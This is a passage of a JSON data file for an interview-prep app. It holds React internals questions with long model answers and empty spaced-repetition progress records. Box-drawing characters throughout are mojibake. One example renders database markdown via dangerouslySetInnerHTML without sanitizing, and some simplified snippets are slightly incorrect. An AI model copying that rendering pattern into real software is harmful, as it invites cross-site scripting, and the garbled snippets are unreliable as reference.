      "answer": "## Reconciliation Overview\n\nReconciliation is the process of comparing the new element tree with the previous one to determine what DOM changes are needed.\n\n```\nNew JSX Tree          Previous Fiber Tree          DOM Updates\n    â”‚                        â”‚                         â”‚\n    â””â”€â”€â”€â”€â”€â”€â–º Reconciler â—„â”€â”€â”€â”€â”˜                         â”‚\n                 â”‚                                     â”‚\n                 â””â”€â–º Determines minimum changes â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Two Key Heuristics\n\nReact's diffing algorithm is O(n) instead of O(nÂ³) due to two heuristics:\n\n### 1. Different Types Produce Different Trees\n\n```tsx\n// When root element type changes, entire tree is replaced\n\n// Before\n<div>\n  <Counter />\n</div>\n\n// After\n<span>\n  <Counter />\n</span>\n\n// Result: Old <div> destroyed, new <span> created\n// Counter state is LOST - it's a new instance\n```\n\n### 2. Keys Identify Elements Across Renders\n\n```tsx\n// Without keys, React uses index-based matching\n// Before: [A, B, C]\n// After:  [X, A, B, C]\n\n// React sees:\n// index 0: A â†’ X (update A to X)\n// index 1: B â†’ A (update B to A)\n// index 2: C â†’ B (update C to B)\n// index 3: null â†’ C (create C)\n// Result: Updates everything! Inefficient.\n\n// With keys:\n// Before: [A:1, B:2, C:3]\n// After:  [X:0, A:1, B:2, C:3]\n\n// React sees:\n// key 1: A â†’ A (no change)\n// key 2: B â†’ B (no change)\n// key 3: C â†’ C (no change)\n// key 0: null â†’ X (create X, insert at start)\n// Result: Only creates X! Efficient.\n```\n\n## Reconciliation Process\n\n```typescript\nfunction reconcileChildren(\n  returnFiber: Fiber,\n  currentChild: Fiber | null,\n  newChild: any\n) {\n  // Single element\n  if (typeof newChild === 'object' && newChild !== null) {\n    return reconcileSingleElement(returnFiber, currentChild, newChild);\n  }\n  \n  // Array of elements\n  if (Array.isArray(newChild)) {\n    return reconcileChildrenArray(returnFiber, currentChild, newChild);\n  }\n  \n  // Text content\n  if (typeof newChild === 'string' || typeof newChild === 'number') {\n    return reconcileSingleTextNode(returnFiber, currentChild, '' + newChild);\n  }\n  \n  // Delete remaining children\n  return deleteRemainingChildren(returnFiber, currentChild);\n}\n```\n\n### Single Element Reconciliation\n\n```typescript\nfunction reconcileSingleElement(\n  returnFiber: Fiber,\n  currentChild: Fiber | null,\n  element: ReactElement\n) {\n  const key = element.key;\n  let child = currentChild;\n  \n  while (child !== null) {\n    if (child.key === key) {\n      // Key matches\n      if (child.type === element.type) {\n        // Same type - REUSE this fiber\n        deleteRemainingChildren(returnFiber, child.sibling);\n        const existing = useFiber(child, element.props);\n        existing.return = returnFiber;\n        return existing;\n      } else {\n        // Different type - delete all\n        deleteRemainingChildren(returnFiber, child);\n        break;\n      }\n    } else {\n      // Key doesn't match - delete this child\n      deleteChild(returnFiber, child);\n    }\n    child = child.sibling;\n  }\n  \n  // No reusable fiber found - create new\n  const created = createFiberFromElement(element);\n  created.return = returnFiber;\n  return created;\n}\n```\n\n### Array Reconciliation (List Diffing)\n\n```typescript\nfunction reconcileChildrenArray(\n  returnFiber: Fiber,\n  currentFirstChild: Fiber | null,\n  newChildren: Array<any>\n) {\n  let resultingFirstChild: Fiber | null = null;\n  let previousNewFiber: Fiber | null = null;\n  let oldFiber = currentFirstChild;\n  let newIdx = 0;\n  \n  // PHASE 1: Walk both lists, looking for matches by key\n  for (; oldFiber !== null && newIdx < newChildren.length; newIdx++) {\n    const newChild = newChildren[newIdx];\n    \n    if (oldFiber.key !== getKey(newChild)) {\n      // Keys don't match - break and use map-based lookup\n      break;\n    }\n    \n    // Keys match - update or reuse fiber\n    const newFiber = updateSlot(returnFiber, oldFiber, newChild);\n    // ... link fiber into result list\n    \n    oldFiber = oldFiber.sibling;\n  }\n  \n  // PHASE 2: If new children exhausted, delete remaining old\n  if (newIdx === newChildren.length) {\n    deleteRemainingChildren(returnFiber, oldFiber);\n    return resultingFirstChild;\n  }\n  \n  // PHASE 3: If old children exhausted, create remaining new\n  if (oldFiber === null) {\n    for (; newIdx < newChildren.length; newIdx++) {\n      const newFiber = createChild(returnFiber, newChildren[newIdx]);\n      // ... link fiber into result list\n    }\n    return resultingFirstChild;\n  }\n  \n  // PHASE 4: Both have remaining - use Map for O(1) lookup\n  const existingChildren = mapRemainingChildren(oldFiber);\n  \n  for (; newIdx < newChildren.length; newIdx++) {\n    const newChild = newChildren[newIdx];\n    const key = getKey(newChild);\n    const matchedFiber = existingChildren.get(key);\n    \n    if (matchedFiber) {\n      // Found match - reuse fiber\n      const newFiber = updateFromMap(returnFiber, matchedFiber, newChild);\n      existingChildren.delete(key);\n      // ... link fiber\n    } else {\n      // No match - create new fiber\n      const newFiber = createChild(returnFiber, newChild);\n      // ... link fiber\n    }\n  }\n  \n  // Delete any remaining unmatched old children\n  existingChildren.forEach(child => deleteChild(returnFiber, child));\n  \n  return resultingFirstChild;\n}\n```\n\n## Key Prop Deep Dive\n\n### Why Index Keys Are Bad\n\n```tsx\n// âŒ Using index as key\n{items.map((item, index) => (\n  <ListItem key={index} item={item} />\n))}\n\n// Scenario: Delete first item from [A, B, C]\n// Before: key=0:A, key=1:B, key=2:C\n// After:  key=0:B, key=1:C\n\n// React sees:\n// - key=0: A â†’ B (update item A to B) ðŸ˜± WRONG!\n// - key=1: B â†’ C (update item B to C) ðŸ˜± WRONG!\n// - key=2: deleted\n\n// Problems:\n// 1. Unnecessary re-renders (all items update)\n// 2. State gets mixed up (form inputs, animations)\n// 3. Effects fire incorrectly\n```\n\n### Correct Key Usage\n\n```tsx\n// âœ… Using stable unique ID\n{items.map(item => (\n  <ListItem key={item.id} item={item} />\n))}\n\n// Same scenario: Delete first item from [A, B, C]\n// Before: key=a:A, key=b:B, key=c:C\n// After:  key=b:B, key=c:C\n\n// React sees:\n// - key=a: deleted âœ“\n// - key=b: B â†’ B (no change) âœ“\n// - key=c: C â†’ C (no change) âœ“\n\n// Only the deleted item is removed!\n```\n\n### Key Rules\n\n```tsx\n// 1. Keys must be STABLE (same across renders)\n// âŒ Bad\n<Item key={Math.random()} /> // New key every render!\n\n// 2. Keys must be UNIQUE among siblings\n// âŒ Bad\n{items.map(item => <Item key=\"same\" item={item} />)}\n\n// 3. Keys don't need to be globally unique\n// âœ… OK - different lists can have same keys\n<ul>{listA.map(i => <li key={i.id}>{i.name}</li>)}</ul>\n<ul>{listB.map(i => <li key={i.id}>{i.name}</li>)}</ul>\n\n// 4. Index is OK when:\n// - List is static (never reorders)\n// - Items have no state/uncontrolled inputs\n// - Items are never reordered, inserted, or deleted\n{staticList.map((item, i) => <StatelessItem key={i} text={item} />)}\n```\n\n## Component Identity and State\n\n```tsx\n// Key determines component identity\nfunction Parent({ showA }) {\n  return showA \n    ? <Child key=\"a\" />  // Instance A\n    : <Child key=\"b\" />; // Instance B (different key = different instance)\n}\n\n// Without key, same position = same instance\nfunction Parent({ showA }) {\n  return showA \n    ? <Child />  // Position 0\n    : <Child />; // Position 0 - SAME instance, state preserved!\n}\n\n// Force reset with key\nfunction Editor({ documentId }) {\n  // When documentId changes, key changes, Editor resets\n  return <DocumentEditor key={documentId} />;\n}\n```",
      "keyPoints": [
        "Understands O(n) heuristics",
        "Knows type comparison rules",
        "Can explain array reconciliation phases",
        "Understands why index keys are problematic",
        "Knows key affects component identity",
        "Can use key to reset component state"
      ],
      "followUpQuestions": [
        "How does React handle adding/removing items in the middle of a list?",
        "What about reconciliation with fragments?",
        "How does Suspense affect reconciliation?",
        "Can you force a component to remount without changing key?"
      ],
      "relatedTopics": [
        "fiber",
        "virtual-dom",
        "performance",
        "keys"
      ],
      "source": "seed",
      "commonAt": [
        "Meta",
        "Any React-heavy company"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "react-internals-003",
      "category": "react-internals",
      "difficulty": "mid",
      "question": "How do React hooks work internally? Why can't hooks be called conditionally, and how does React track hook state between renders?",
      "answer": "## Hook Storage: The Fiber's Hook List\n\nEach fiber has a linked list of hooks. React uses the **call order** to match hooks between renders.\n\n```typescript\n// Fiber's memoizedState points to first hook\ninterface Fiber {\n  memoizedState: Hook | null; // First hook in the list\n  // ...\n}\n\ninterface Hook {\n  memoizedState: any;        // Hook's state (useState value, useRef.current, etc.)\n  baseState: any;            // For reducers\n  baseQueue: Update | null;  // Pending updates\n  queue: UpdateQueue | null; // Update queue\n  next: Hook | null;         // Next hook in list\n}\n```\n\n```\nComponent renders:\nuseState(0)     â†’ Hook 1 { memoizedState: 0, next: â†’ }\nuseEffect(...)  â†’ Hook 2 { memoizedState: effect, next: â†’ }\nuseMemo(...)    â†’ Hook 3 { memoizedState: [value, deps], next: â†’ }\nuseState('')    â†’ Hook 4 { memoizedState: '', next: null }\n\nFiber.memoizedState â†’ [Hook 1] â†’ [Hook 2] â†’ [Hook 3] â†’ [Hook 4]\n```\n\n## Why Call Order Matters\n\n```typescript\n// React tracks hooks by INDEX (position), not by name\n\n// First render:\nfunction Component() {\n  const [a, setA] = useState(1);  // Hook 0: { memoizedState: 1 }\n  const [b, setB] = useState(2);  // Hook 1: { memoizedState: 2 }\n  return <div>{a} {b}</div>;\n}\n\n// Second render (after setA(10)):\nfunction Component() {\n  const [a, setA] = useState(1);  // Reads Hook 0 â†’ gets 10 âœ“\n  const [b, setB] = useState(2);  // Reads Hook 1 â†’ gets 2 âœ“\n  return <div>{a} {b}</div>;\n}\n```\n\n### What Happens With Conditional Hooks\n\n```typescript\n// âŒ Broken: Conditional hook\nfunction Component({ showExtra }) {\n  const [a, setA] = useState(1);   // Hook 0\n  \n  if (showExtra) {\n    const [extra, setExtra] = useState('x'); // Hook 1 (sometimes)\n  }\n  \n  const [b, setB] = useState(2);   // Hook 1 or 2?\n}\n\n// First render (showExtra = true):\n// Hook 0: a = 1\n// Hook 1: extra = 'x'\n// Hook 2: b = 2\n\n// Second render (showExtra = false):\n// Hook 0: a = 1       âœ“\n// Hook 1: b reads from 'extra' position â†’ b = 'x' ðŸ’¥ WRONG!\n// Hook 2: ??? â†’ Error: more hooks than expected\n```\n\n## Internal Implementation\n\n```typescript\n// Simplified hook dispatcher\nlet currentlyRenderingFiber: Fiber | null = null;\nlet workInProgressHook: Hook | null = null;\n\nfunction renderWithHooks(fiber: Fiber, Component: Function, props: any) {\n  currentlyRenderingFiber = fiber;\n  \n  // Reset hook pointer\n  workInProgressHook = fiber.memoizedState; // Start of hook list\n  \n  // Call component - this calls hooks\n  const children = Component(props);\n  \n  currentlyRenderingFiber = null;\n  return children;\n}\n\n// useState implementation\nfunction useState<T>(initialState: T): [T, Dispatch<T>] {\n  return useReducer(\n    (state: T, action: T | ((prev: T) => T)) => \n      typeof action === 'function' ? (action as Function)(state) : action,\n    initialState\n  );\n}\n\nfunction useReducer<S, A>(reducer: Reducer<S, A>, initialState: S): [S, Dispatch<A>] {\n  const hook = updateWorkInProgressHook();\n  \n  if (isMount) {\n    // First render - initialize\n    hook.memoizedState = initialState;\n    hook.queue = createUpdateQueue();\n  } else {\n    // Update - process queued updates\n    const queue = hook.queue;\n    let newState = hook.memoizedState;\n    \n    const pending = queue.pending;\n    if (pending !== null) {\n      let update = pending.next;\n      do {\n        newState = reducer(newState, update.action);\n        update = update.next;\n      } while (update !== pending.next);\n      \n      queue.pending = null;\n    }\n    \n    hook.memoizedState = newState;\n  }\n  \n  const dispatch = (action: A) => {\n    const update = { action, next: null };\n    enqueueUpdate(hook.queue, update);\n    scheduleUpdateOnFiber(currentlyRenderingFiber);\n  };\n  \n  return [hook.memoizedState, dispatch];\n}\n\nfunction updateWorkInProgressHook(): Hook {\n  let hook: Hook;\n  \n  if (workInProgressHook === null) {\n    // First hook in this render\n    const current = currentlyRenderingFiber.alternate;\n    if (current !== null) {\n      // Update: clone from current\n      hook = cloneHook(current.memoizedState);\n    } else {\n      // Mount: create new\n      hook = createHook();\n    }\n    currentlyRenderingFiber.memoizedState = hook;\n  } else {\n    // Subsequent hook\n    const current = currentlyRenderingFiber.alternate;\n    if (current !== null) {\n      hook = cloneHook(workInProgressHook.next);\n    } else {\n      hook = createHook();\n    }\n    workInProgressHook.next = hook;\n  }\n  \n  workInProgressHook = hook;\n  return hook;\n}\n```\n\n## useEffect Implementation\n\n```typescript\nfunction useEffect(create: () => (() => void) | void, deps?: DependencyList) {\n  const hook = updateWorkInProgressHook();\n  const nextDeps = deps === undefined ? null : deps;\n  \n  if (currentlyRenderingFiber.alternate !== null) {\n    const prevEffect = hook.memoizedState;\n    const prevDeps = prevEffect.deps;\n    \n    if (areHookInputsEqual(nextDeps, prevDeps)) {\n      // Dependencies unchanged - push passive effect without HasEffect flag\n      hook.memoizedState = pushEffect(PassiveStatic, create, destroy, nextDeps);\n      return;\n    }\n  }\n  \n  // Dependencies changed or first mount\n  currentlyRenderingFiber.flags |= PassiveEffect;\n  hook.memoizedState = pushEffect(\n    HookHasEffect | PassiveStatic,\n    create,\n    undefined,\n    nextDeps\n  );\n}\n\nfunction areHookInputsEqual(\n  nextDeps: DependencyList | null,\n  prevDeps: DependencyList | null\n): boolean {\n  if (prevDeps === null) return false;\n  \n  for (let i = 0; i < prevDeps.length && i < nextDeps.length; i++) {\n    if (Object.is(nextDeps[i], prevDeps[i])) {\n      continue;\n    }\n    return false;\n  }\n  return true;\n}\n```\n\n## Rules of Hooks Explained\n\n```typescript\n// Rule 1: Only call at top level\n// WHY: Preserves call order for hook matching\n\n// âŒ Inside condition\nif (condition) {\n  useState(); // Order changes between renders\n}\n\n// âŒ Inside loop\nfor (let i = 0; i < count; i++) {\n  useState(); // Number of hooks changes\n}\n\n// âŒ Inside nested function\nconst handler = () => {\n  useState(); // Called after render, no fiber context\n};\n\n// Rule 2: Only call from React functions\n// WHY: Hooks need fiber context (currentlyRenderingFiber)\n\n// âŒ Regular function\nfunction helper() {\n  const [state] = useState(); // No fiber!\n}\n\n// âœ… React component\nfunction Component() {\n  const [state] = useState(); // Fiber exists\n}\n\n// âœ… Custom hook (will be called from component)\nfunction useCustom() {\n  const [state] = useState(); // Fiber exists via call stack\n}\n```\n\n## Hook Types Reference\n\n| Hook | memoizedState stores |\n|------|---------------------|\n| useState | Current state value |\n| useReducer | Current state value |\n| useRef | { current: value } object |\n| useMemo | [cachedValue, deps] |\n| useCallback | [cachedFn, deps] |\n| useEffect | Effect object with create/destroy |\n| useContext | (reads from context, no memoizedState) |",
      "keyPoints": [
        "Knows hooks are stored as linked list",
        "Understands call order matching",
        "Can explain why conditional hooks break",
        "Knows useState is implemented with useReducer",
        "Understands dependency comparison",
        "Knows what each hook stores in memoizedState"
      ],
      "followUpQuestions": [
        "How does useContext differ from other hooks?",
        "Why does useState use Object.is for comparison?",
        "How do custom hooks share state?",
        "What about hooks in concurrent mode?"
      ],
      "relatedTopics": [
        "hooks",
        "fiber",
        "state-management",
        "closures"
      ],
      "source": "seed",
      "commonAt": [
        "Meta",
        "Any React company"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "react-internals-004",
      "category": "react-internals",
      "difficulty": "mid",
      "question": "Explain React Server Components (RSC). What problems do they solve, and how do they differ from traditional SSR?",
      "answer": "## Traditional SSR vs RSC\n\n### Traditional SSR\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Server                                                         â”‚\nâ”‚  â•â•â•â•â•â•â•                                                        â”‚\nâ”‚  1. Render to HTML string                                       â”‚\nâ”‚  2. Send HTML + ALL JS bundles                                  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                              â”‚\n                              â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Client                                                         â”‚\nâ”‚  â•â•â•â•â•â•â•                                                        â”‚\nâ”‚  1. Display HTML (fast FCP)                                     â”‚\nâ”‚  2. Download JS bundle (includes ALL components)                â”‚\nâ”‚  3. Hydrate: Re-run ALL components, attach event listeners      â”‚\nâ”‚                                                                 â”‚\nâ”‚  Problem: Must re-execute everything client-side                â”‚\nâ”‚           Large bundle includes server-only code                â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### React Server Components\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Server                                                         â”‚\nâ”‚  â•â•â•â•â•â•â•                                                        â”‚\nâ”‚  1. Render Server Components â†’ RSC Payload (serialized tree)    â”‚\nâ”‚  2. Send RSC Payload + ONLY Client Component JS                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                              â”‚\n                              â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Client                                                         â”‚\nâ”‚  â•â•â•â•â•â•â•                                                        â”‚\nâ”‚  1. Display rendered content                                    â”‚\nâ”‚  2. Download ONLY client component JS                           â”‚\nâ”‚  3. Hydrate ONLY client components                              â”‚\nâ”‚                                                                 â”‚\nâ”‚  Benefit: Server-only code stays on server                      â”‚\nâ”‚           Smaller bundles, less hydration work                  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## RSC vs SSR Key Differences\n\n| Aspect | Traditional SSR | React Server Components |\n|--------|-----------------|------------------------|\n| Rendering | Server renders HTML | Server renders RSC payload |\n| Bundle | All components sent | Only client components |\n| Hydration | Re-execute all | Only client components |\n| Server code | Bundled & sent | Stays on server |\n| Data fetching | useEffect or getServerSideProps | Direct in component |\n| Updates | Full page or SPA navigation | Stream new RSC payload |\n\n## Server Component Capabilities\n\n```tsx\n// Server Component - runs ONLY on server\n// File: app/products/page.tsx (no 'use client')\n\nimport { db } from '@/lib/database';     // Direct DB access!\nimport { parseMarkdown } from 'marked';  // Heavy library - not in bundle\n\nasync function ProductPage({ params }: { params: { id: string } }) {\n  // Direct database query - no API needed\n  const product = await db.products.findUnique({\n    where: { id: params.id },\n    include: { reviews: true },\n  });\n  \n  // Use heavy libraries without bundle cost\n  const description = parseMarkdown(product.description);\n  \n  // Access server-only secrets\n  const apiKey = process.env.SECRET_API_KEY;\n  const analytics = await fetch(`https://api.com?key=${apiKey}`);\n  \n  return (\n    <div>\n      <h1>{product.name}</h1>\n      <div dangerouslySetInnerHTML={{ __html: description }} />\n      \n      {/* Client component for interactivity */}\n      <AddToCartButton productId={product.id} />\n      \n      {/* Server component for reviews */}\n      <ReviewList reviews={product.reviews} />\n    </div>\n  );\n}\n```\n\n## Client Components\n\n```tsx\n// Client Component - runs on client (and server for SSR)\n// File: components/AddToCartButton.tsx\n'use client';  // â† Required directive\n\nimport { useState } from 'react';\nimport { useCart } from '@/hooks/useCart';\n\nexport function AddToCartButton({ productId }: { productId: string }) {\n  const [isAdding, setIsAdding] = useState(false);\n  const { addItem } = useCart();\n  \n  async function handleClick() {\n    setIsAdding(true);\n    await addItem(productId);\n    setIsAdding(false);\n  }\n  \n  return (\n    <button onClick={handleClick} disabled={isAdding}>\n      {isAdding ? 'Adding...' : 'Add to Cart'}\n    </button>\n  );\n}\n```\n\n## Component Tree and Boundaries\n\n```\nServer Component (Root)\nâ”‚\nâ”œâ”€â”€ Server Component (can do async, db, secrets)\nâ”‚   â”‚\nâ”‚   â”œâ”€â”€ Client Component ('use client')\nâ”‚   â”‚   â”‚\nâ”‚   â”‚   â””â”€â”€ Any Component (becomes client)\nâ”‚   â”‚       â”‚\nâ”‚   â”‚       â””â”€â”€ All descendants are client\nâ”‚   â”‚\nâ”‚   â””â”€â”€ Server Component (still server!)\nâ”‚\nâ””â”€â”€ Client Component\n    â”‚\n    â””â”€â”€ Can render Server Components as children\n        (passed as props, not imported)\n```\n\n```tsx\n// âœ… Correct: Server component as children\n// Server\nfunction ServerParent() {\n  return (\n    <ClientWrapper>\n      <ServerChild /> {/* Works! Passed as children prop */}\n    </ClientWrapper>\n  );\n}\n\n// Client\n'use client';\nfunction ClientWrapper({ children }: { children: React.ReactNode }) {\n  const [count, setCount] = useState(0);\n  return (\n    <div>\n      <button onClick={() => setCount(c => c + 1)}>{count}</button>\n      {children}\n    </div>\n  );\n}\n\n// âŒ Wrong: Importing server component in client\n'use client';\nimport { ServerComponent } from './ServerComponent'; // Error or becomes client!\n```\n\n## RSC Payload\n\n```javascript\n// What the server sends (simplified)\n// Not HTML - it's a serialized React tree\n\n0: [\"$\", \"div\", null, {\n  \"children\": [\n    [\"$\", \"h1\", null, { \"children\": \"Product Name\" }],\n    [\"$\", \"$Lc\", \"1\", { \"productId\": \"123\" }],  // Client component reference\n    [\"$\", \"div\", null, { \"children\": \"Description...\" }]\n  ]\n}]\n\n// $Lc = Client component\n// \"1\" = Chunk/module reference\n// The actual component code is in a separate JS file\n\n// Client components are \"holes\" in the server tree\n// Browser fills them in with actual interactive components\n```\n\n## When to Use Each\n\n```tsx\n// SERVER COMPONENTS for:\n// âœ“ Data fetching\n// âœ“ Accessing backend resources\n// âœ“ Keeping sensitive info on server\n// âœ“ Large dependencies (syntax highlighters, markdown)\n// âœ“ Static content\n\n// CLIENT COMPONENTS for:\n// âœ“ Interactivity (onClick, onChange)\n// âœ“ State (useState, useReducer)\n// âœ“ Effects (useEffect)\n// âœ“ Browser APIs (localStorage, geolocation)\n// âœ“ Custom hooks with state/effects\n// âœ“ Class components\n\n// PATTERN: Push client boundaries down\n// âŒ Making entire page client\n'use client';\nexport default function Page() { ... }\n\n// âœ… Only interactive parts are client\nexport default function Page() {\n  const data = await fetchData();\n  return (\n    <div>\n      <StaticHeader />\n      <InteractiveChart data={data} /> {/* 'use client' */}\n      <StaticFooter />\n    </div>\n  );\n}\n```",
      "keyPoints": [
        "Understands RSC vs traditional SSR difference",
        "Knows server components stay on server",
        "Can identify what needs 'use client'",
        "Understands the component tree boundaries",
        "Knows RSC payload format conceptually",
        "Can optimize by pushing client boundaries down"
      ],
      "followUpQuestions": [
        "How does streaming work with RSC?",
        "What about caching RSC payloads?",
        "How do RSC handle forms and mutations?",
        "What's the relationship between RSC and Suspense?"
      ],
      "relatedTopics": [
        "nextjs",
        "ssr",
        "streaming",
        "hydration"
      ],
      "source": "seed",
      "commonAt": [
        "Vercel",
        "Companies using Next.js 13+"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    }
  ],
  "progress": [
    {
      "id": "progress-system-design-001",
      "questionId": "system-design-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-system-design-002",
      "questionId": "system-design-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-system-design-003",
      "questionId": "system-design-003",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-system-design-004",
      "questionId": "system-design-004",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-system-design-005",
      "questionId": "system-design-005",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-system-design-006",
      "questionId": "system-design-006",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-caching-memoization-001",
      "questionId": "caching-memoization-001",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-caching-memoization-002",
      "questionId": "caching-memoization-002",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-caching-memoization-003",
      "questionId": "caching-memoization-003",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-caching-memoization-004",
      "questionId": "caching-memoization-004",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
      "totalReviews": 0,
      "correctReviews": 0,
      "averageQuality": 0,
      "reviewHistory": [],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z"
    },
    {
      "id": "progress-caching-memoization-005",
      "questionId": "caching-memoization-005",
      "sm2": {
        "easeFactor": 2.5,
        "interval": 0,
        "repetitions": 0,
        "nextReviewDate": "2026-01-03T11:53:57.761Z",
        "lastReviewDate": null
      },
